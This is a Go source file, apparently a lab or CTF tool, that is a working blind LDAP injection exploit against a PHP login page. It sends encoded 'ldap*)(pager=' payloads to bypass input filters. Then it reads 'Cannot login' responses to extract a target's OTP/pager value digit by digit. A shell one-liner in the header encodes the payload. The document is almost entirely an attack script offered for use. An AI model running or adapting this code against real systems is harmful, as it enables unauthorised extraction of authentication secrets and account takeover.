/*
LDAP_PostExfil_Deduction.go
chris.downs[at]reticulipictures.com

ref:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection

base LDAP injection req --
echo -ne '*)(pager=*' | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
%2a%29%28%70%61%67%65%72%3d%2a

disclaimer --
I'm new to golang so cut me some space dawg --
*/

package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// const
const (
	LDAPloginUrl = "http://<target ip>/login.php?"
)

// main --
func main() {
	// vars
	var (
		user  = "ldap*)(pager="
		token = "0123456"
	)

	// start iteration loops --
	fmt.Printf("%s\n", "Exfiltrating Target OTP: ")
	nums := make([]int, 0, 81)
	for x := 0; x <= 81; x++ {
		nums = append(nums, x)

		var enc string
		var exfil string

		for i := 0; i <= 9; i++ {
			i := strconv.Itoa(i)
			inj := strings.Join([]string{user, i, "*"}, "")

			// return from Ascii_HexEncode --
			enc = Ascii_HexEncode(inj)

			// Get exfile data --
			exfil = LDAP_PostExfil_Deduction(enc, user, token, i)
			user = strings.Join([]string{user, exfil}, "")
			time.Sleep(1 * time.Second)
		}
	}
	os.Exit(3)
}

// Ascii_HexEncode --
func Ascii_HexEncode(inject string) string {
	inputUsername := []byte(inject)
	re := regexp.MustCompile(`[0-9A-Fa-f]{2}`)

	// filter bypass --
	// pre encode form request --
	penc := hex.EncodeToString(inputUsername)
	enc := re.ReplaceAllString(penc, "%$0")

	return enc
}

// LDAP_PostExfil_Deduction --
func LDAP_PostExfil_Deduction(enc string, user string, token string, i string) string {
	form := url.Values{}
	form.Add("inputUsername", enc)
	form.Add("inputOTP", token)

	// post form -
	client := &http.Client{}
	req, err := http.NewRequest("POST", LDAPloginUrl, strings.NewReader(form.Encode()))
	perror(err)

	// request headers --
	// update if required --
	req.Header.Set("Host", "target.tld")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0")
	req.Header.Set("Referer", "http://target.tld/login.php")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", "PHPSESSID=docqjh2am2ckhvd6q7a8phjfv4")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	res, err := client.Do(req)
	perror(err)
	defer res.Body.Close()

	buf, err := ioutil.ReadAll(res.Body)

	b := string(buf)
	r := regexp.MustCompile(`Cannot login`)
	m := r.FindString(string(b))
	c := strings.Compare(m, "Cannot login")
	var exfil string
	if c == 0 {
		fmt.Printf("%s", i)
		exfil = i
	}
	return exfil
}

// lazy man errors --
func perror(err error) {
	if err != nil {
		panic(err)
	}
}

/*
LEAVE SOME SPACE FOR vim EDDY --



*/
// __EOF __
